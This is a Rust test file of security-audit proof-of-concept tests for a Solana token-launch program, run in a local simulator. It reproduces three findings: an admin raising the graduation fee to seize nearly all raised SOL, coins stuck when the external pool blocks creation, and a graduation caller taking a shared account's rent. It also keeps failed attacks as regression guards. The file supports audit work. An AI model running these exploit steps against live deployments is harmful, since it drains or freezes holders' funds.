//! Red-team PoCs (custody scope). Each `poc_*` test PASSES when the issue reproduces
//! against the current code. `nofinding_*` tests document attacks that were tried and
//! FAIL against the current code (kept as regression guards).

use anchor_lang::prelude::{AccountMeta as Meta, Pubkey};
use fumpad::{external::pumpswap::WSOL_MINT, state::{CoinStatus, Params}};
use solana_keypair::Keypair;

use crate::flow::*;
use crate::*;

fn completed() -> (Flow, Keypair) {
    let mut f = Flow::new();
    let whale = f.env.new_user(10_000);
    ok(f.buy(&whale, 200 * SOL));
    assert_eq!(f.coin_state().status, CoinStatus::Complete);
    (f, whale)
}

fn graduated() -> (Flow, Keypair) {
    let (mut f, whale) = completed();
    ok(f.graduate());
    f.post_graduation_setup();
    (f, whale)
}

fn update_params(f: &mut Flow, params: Params) {
    let i = ix(
        fumpad::accounts::AdminOnly { admin: kp_pk(&f.env.admin), global: f.env.global_pda() },
        fumpad::instruction::UpdateParams { params },
    );
    let admin = f.env.admin.insecure_clone();
    ok(f.env.send(&[i], &[&admin]));
}

fn send_lamports_ix(from: &Pubkey, to: &Pubkey, lamports: u64) -> solana_instruction::Instruction {
    let mut data = vec![2, 0, 0, 0];
    data.extend_from_slice(&lamports.to_le_bytes());
    raw_ix(SYSTEM, vec![Meta::new(*from, true), w(*to)], data)
}

// ═════════════════════════════════════════════════════════════════════════════
// Findings
// ═════════════════════════════════════════════════════════════════════════════

/// [M] `graduation_fee_lamports` is read from Global at graduation time, not snapshotted at
/// create_coin, and `is_valid` only bounds it by `graduation_lamports` (itself unused by the
/// curve). With one `update_params` (no timelock) the admin can retroactively take almost
/// all SOL raised by every Complete coin into `platform_fees_unclaimed`, seed the PumpSwap
/// pool with 1 lamport of SOL, and sweep the rest to the treasury.
#[test]
fn poc_admin_retroactive_graduation_fee_takes_raised_sol() {
    let (mut f, _whale) = completed();
    let raised = f.coin_state().real_sol_reserves;
    assert!(raised > 84 * SOL);
    update_params(&mut f, Params { graduation_fee_lamports: raised - 1, graduation_lamports: u64::MAX, ..Params::default() });
    ok(f.graduate());
    assert_eq!(token_balance(&f.env, &f.pool_quote), 1, "pool seeded with 1 lamport");
    let treasury = kp_pk(&f.env.treasury);
    let t0 = f.env.lamports(&treasury);
    ok(f.withdraw_platform_fees());
    let taken = f.env.lamports(&treasury) - t0;
    assert!(taken >= raised - 1, "treasury took {taken} of {raised}");
    // Holders are left with a pool priced ~85e9x lower than the curve's final price.
    f.assert_invariant();
}

/// [M] A Complete coin has no exit: buy/sell require `Curve`, and the only transition is
/// `graduate`, which depends on PumpSwap `create_pool`. Any PumpSwap-side block
/// (GlobalConfig.disable_flags bit 0 = disable_create_pool, set by the PumpSwap admin; or an
/// incompatible create_pool upgrade) freezes the raised SOL and every holder's position with
/// no refund / timeout path. Simulated here by flipping the PumpSwap admin flag.
#[test]
fn poc_complete_coin_has_no_exit_when_pumpswap_blocks_create_pool() {
    let (mut f, whale) = completed();
    let mut gc = f.env.account(&fumpad::PUMPSWAP_GLOBAL_CONFIG).unwrap();
    gc.data[56] |= 1; // disable_create_pool
    f.env.svm.set_account(addr(&fumpad::PUMPSWAP_GLOBAL_CONFIG), gc).unwrap();
    assert!(f.graduate().is_err());
    // Nobody can get out.
    let held = f.tokens(&kp_pk(&whale));
    assert!(held > 0);
    expect_err(f.sell(&whale, held / 10), fumpad::error::FumpadError::WrongCoinStatus);
    expect_err(f.buy(&whale, SOL), fumpad::error::FumpadError::WrongCoinStatus);
    assert!(f.coin_state().real_sol_reserves > 84 * SOL, "raised SOL stuck in the Coin PDA");
}

/// [L] `graduate` (any coin) closes ATA(pool_authority, WSOL) to its caller. That same
/// account is `execute_buyback`'s persistent `buyback_wsol` (init_if_needed, rent paid by the
/// buyback cranker, and documented to keep "unspent remainder" dust). Every graduation hands
/// that rent + any wrapped balance to whoever calls `graduate`.
#[test]
fn poc_graduate_sweeps_shared_buyback_wsol_to_caller() {
    // Coin A graduates; its buyback crank runs once → ATA(pool_authority, WSOL) now persists
    // (rent paid by the buyback cranker).
    let (mut a, _) = graduated();
    let shared = ata(&pool_authority(), &WSOL_MINT, &TOKEN);
    let t = a.env.new_user(100);
    ok(a.swap_buy(&t, 20 * SOL));
    a.keeper_samples(130, 15);
    ok(a.execute_buyback(u64::MAX));
    let shared_lamports = a.env.lamports(&shared);
    assert!(shared_lamports > 0, "buyback WSOL ATA persists");
    // Coins B and C in the same deployment, both completed.
    let mut f = Flow { env: std::mem::replace(&mut a.env, Env::new()), ..fresh_coin_shell() };
    let whale = f.env.new_user(10_000);
    create_coin_in(&mut f);
    ok(f.buy(&whale, 200 * SOL));
    let b_ixs = graduate_ixs(&f, &Pubkey::default());
    create_coin_in(&mut f);
    ok(f.buy(&whale, 200 * SOL));
    let c_ixs = graduate_ixs(&f, &Pubkey::default());
    // Graduate B, then C, each by a fresh caller; measure each caller's net.
    let mut net = vec![];
    for mut ixs in [b_ixs, c_ixs] {
        let caller = f.env.new_user(1);
        let c = kp_pk(&caller);
        ixs[1].accounts[0].pubkey = addr(&c);
        let before = f.env.lamports(&c);
        ok(f.env.send_as(&caller, &ixs, &[&caller]));
        net.push(f.env.lamports(&c) as i128 - before as i128);
    }
    // Same accounts created both times; B's caller is richer by exactly the shared ATA.
    assert_eq!(net[0] - net[1], shared_lamports as i128, "B's graduate caller pocketed the buyback ATA");
    assert!(f.env.account(&shared).map_or(true, |x| x.lamports == 0));
}

// ── helpers for multi-coin envs ─────────────────────────────────────────────────

fn fresh_coin_shell() -> Flow {
    // Placeholder fields; overwritten by create_coin_in.
    let k = Pubkey::default();
    Flow {
        env: Env::new(),
        creator: Keypair::new(),
        mint: k,
        coin: k,
        pool: k,
        pool_base: k,
        pool_quote: k,
        reward_vault: k,
        curve_vault: k,
        observations: k,
        queue: k,
        buyback_fee_recipient_ata: k,
    }
}

fn create_coin_in(f: &mut Flow) {
    use fumpad::external::pumpswap::pool_pda;
    let creator = f.env.new_user(10);
    let mint_kp = Keypair::new();
    let mint = kp_pk(&mint_kp);
    let pa = pool_authority();
    let pool = pool_pda(0, &pa, &mint, &WSOL_MINT);
    f.creator = creator.insecure_clone();
    f.mint = mint;
    f.coin = fpda(&[fumpad::COIN_SEED, mint.as_ref()]);
    f.reward_vault = fpda(&[fumpad::REWARD_VAULT_SEED, mint.as_ref()]);
    f.curve_vault = fpda(&[fumpad::CURVE_VAULT_SEED, mint.as_ref()]);
    f.observations = fpda(&[fumpad::OBSERVATIONS_SEED, mint.as_ref()]);
    f.queue = fpda(&[fumpad::CLAIM_QUEUE_SEED, mint.as_ref()]);
    f.pool = pool;
    f.pool_base = ata(&pool, &mint, &T22);
    f.pool_quote = ata(&pool, &WSOL_MINT, &TOKEN);
    let i = ix(
        fumpad::accounts::CreateCoin {
            creator: kp_pk(&creator),
            global: f.env.global_pda(),
            mint,
            mint_authority: fpda(&[fumpad::MINT_AUTHORITY_SEED]),
            coin: f.coin,
            pool_authority: pa,
            reward_vault: f.reward_vault,
            curve_vault: f.curve_vault,
            token_program: T22,
            system_program: SYSTEM,
            event_authority: event_authority(),
            program: fumpad::ID,
        },
        fumpad::instruction::CreateCoin { name: "B".into(), symbol: "B".into(), uri: "".into() },
    );
    ok(f.env.send(&[i], &[&creator, &mint_kp]));
}

fn graduate_ixs(f: &Flow, payer: &Pubkey) -> Vec<solana_instruction::Instruction> {
    use fumpad::external::pumpswap::{event_authority_pda, lp_mint_pda};
    let pa = pool_authority();
    let lp_mint = lp_mint_pda(&f.pool);
    let (lock, auth, vault) = locker_accounts(&f.pool);
    vec![
        cu_limit(400_000),
        ix(
            fumpad::accounts::Graduate {
                payer: *payer,
                global: f.env.global_pda(),
                coin: f.coin,
                mint: f.mint,
                pool_authority: pa,
                curve_vault: f.curve_vault,
                wsol_mint: WSOL_MINT,
                pool_authority_wsol: ata(&pa, &WSOL_MINT, &TOKEN),
                amm_pool: f.pool,
                amm_global_config: fumpad::PUMPSWAP_GLOBAL_CONFIG,
                lp_mint,
                pool_authority_lp: ata(&pa, &lp_mint, &T22),
                pool_base_vault: f.pool_base,
                pool_quote_vault: f.pool_quote,
                amm_event_authority: event_authority_pda(),
                amm_program: fumpad::PUMPSWAP_PROGRAM_ID,
                lp_lock: lock,
                lp_locker_authority: auth,
                lp_vault: vault,
                lp_locker_program: fumpad_lp_locker::ID,
                token_program: T22,
                quote_token_program: TOKEN,
                associated_token_program: ATA_PROGRAM,
                system_program: SYSTEM,
                event_authority: event_authority(),
                program: fumpad::ID,
            },
            fumpad::instruction::Graduate {},
        ),
    ]
}

// ═════════════════════════════════════════════════════════════════════════════
// Attacks tried that FAIL (no finding) — regression guards
// ═════════════════════════════════════════════════════════════════════════════

/// Pre-creating the PumpSwap pool vault ATAs, and pre-funding every PDA graduation will
/// `init` (pool, LP mint, Lock, locker LP vault), does not block graduation.
#[test]
fn nofinding_graduate_survives_precreated_and_prefunded_accounts() {
    use fumpad::external::pumpswap::lp_mint_pda;
    let (mut f, _whale) = completed();
    let griefer = f.env.new_user(10);
    let g = kp_pk(&griefer);
    let mut i1 = create_ata_ix(&g, &f.pool, &f.mint, &T22);
    i1.data = vec![0];
    let mut i2 = create_ata_ix(&g, &f.pool, &WSOL_MINT, &TOKEN);
    i2.data = vec![0];
    ok(f.env.send_as(&griefer, &[i1, i2], &[&griefer]));
    let lp_mint = lp_mint_pda(&f.pool);
    let (lock, _, vault) = locker_accounts(&f.pool);
    let pa = pool_authority();
    let ixs: Vec<_> = [f.pool, lp_mint, lock, vault, ata(&pa, &lp_mint, &T22)]
        .iter()
        .map(|k| send_lamports_ix(&g, k, 1_000_000))
        .collect();
    ok(f.env.send_as(&griefer, &ixs, &[&griefer]));
    ok(f.graduate());
    assert_eq!(f.coin_state().status, CoinStatus::Graduated);
}

/// Anyone can `init_boost` a FUMPAD pool; then PumpSwap's boost authority (simulated) tries
/// `boost_buy_and_burn`.
fn try_boost(f: &mut Flow) -> litesvm::types::TransactionResult {
    let s = f.env.new_user(10);
    let bva = pda(&[b"boost_vault", f.pool.as_ref()], &fumpad::PUMPSWAP_PROGRAM_ID);
    let init = raw_ix(
        fumpad::PUMPSWAP_PROGRAM_ID,
        vec![
            w(f.pool),
            r(fumpad::PUMPSWAP_GLOBAL_CONFIG),
            Meta::new(kp_pk(&s), true),
            r(f.mint),
            r(WSOL_MINT),
            r(f.pool_base),
            w(f.pool_quote),
            r(bva),
            w(ata(&bva, &WSOL_MINT, &TOKEN)),
            r(TOKEN),
            r(SYSTEM),
            r(ATA_PROGRAM),
            r(fumpad::external::pumpswap::event_authority_pda()),
            r(fumpad::PUMPSWAP_PROGRAM_ID),
        ],
        vec![140, 233, 33, 94, 132, 90, 194, 143],
    );
    ok(f.env.send_as(&s, &[cu_limit(400_000), init], &[&s])); // stranger CAN init_boost
    // Even PumpSwap's boost authority can't boost it (simulated by taking that role).
    let mut gc = f.env.account(&fumpad::PUMPSWAP_GLOBAL_CONFIG).unwrap();
    gc.data[907..939].copy_from_slice(kp_pk(&s).as_ref());
    f.env.svm.set_account(addr(&fumpad::PUMPSWAP_GLOBAL_CONFIG), gc).unwrap();
    let bv = ata(&bva, &WSOL_MINT, &TOKEN);
    put_token_account(&mut f.env, bv, WSOL_MINT, bva, 10 * SOL, TOKEN);
    let mut data = vec![105, 68, 6, 175, 0, 7, 35, 162];
    data.extend_from_slice(&(10 * SOL).to_le_bytes());
    data.extend_from_slice(&0u64.to_le_bytes());
    let burn = raw_ix(
        fumpad::PUMPSWAP_PROGRAM_ID,
        vec![
            r(f.pool),
            Meta::new(kp_pk(&s), true),
            r(fumpad::PUMPSWAP_GLOBAL_CONFIG),
            w(f.mint),
            r(WSOL_MINT),
            w(f.pool_base),
            w(f.pool_quote),
            r(bva),
            w(bv),
            r(T22),
            r(TOKEN),
            r(fumpad::external::pumpswap::event_authority_pda()),
            r(fumpad::PUMPSWAP_PROGRAM_ID),
        ],
        data,
    );
    f.env.send_as(&s, &[cu_limit(400_000), burn], &[&s])
}

fn outside_volume(f: &mut Flow, n: usize, sol: u64) {
    let t = f.env.new_user(1000);
    let tk = kp_pk(&t);
    ok(f.env.send_as(&t, &[create_ata_ix(&tk, &tk, &f.mint, &T22)], &[&t]));
    for _ in 0..n {
        let i = f.direct_buy_ix(&tk, sol, true);
        ok(f.env.send_as(&t, &[cu_limit(400_000), i], &[&t]));
        let got = f.tokens(&tk);
        let i = f.direct_sell_ix(&tk, got);
        ok(f.env.send_as(&t, &[cu_limit(400_000), i], &[&t]));
        f.env.warp(1);
    }
}

/// Fresh FUMPAD pool (virtual reserves 0): PumpSwap refuses to boost it.
#[test]
fn nofinding_boost_fresh_pool() {
    let (mut f, _) = graduated();
    expect_custom(try_boost(&mut f), 6065); // PoolCannotBoost
}

/// After ordinary v2 volume the pool's virtual_quote_reserves is −protocol_fees ≠ 0.
/// Still not boostable (PumpSwap requires positive virtual reserves); skims keep working.
#[test]
fn nofinding_boost_after_volume() {
    let (mut f, _) = graduated();
    outside_volume(&mut f, 5, 50 * SOL);
    let p = f.env.account(&f.pool).unwrap().data;
    assert!(i128::from_le_bytes(p[245..261].try_into().unwrap()) < 0);
    expect_custom(try_boost(&mut f), 6065);
    outside_volume(&mut f, 5, 50 * SOL);
    ok(f.skim());
}
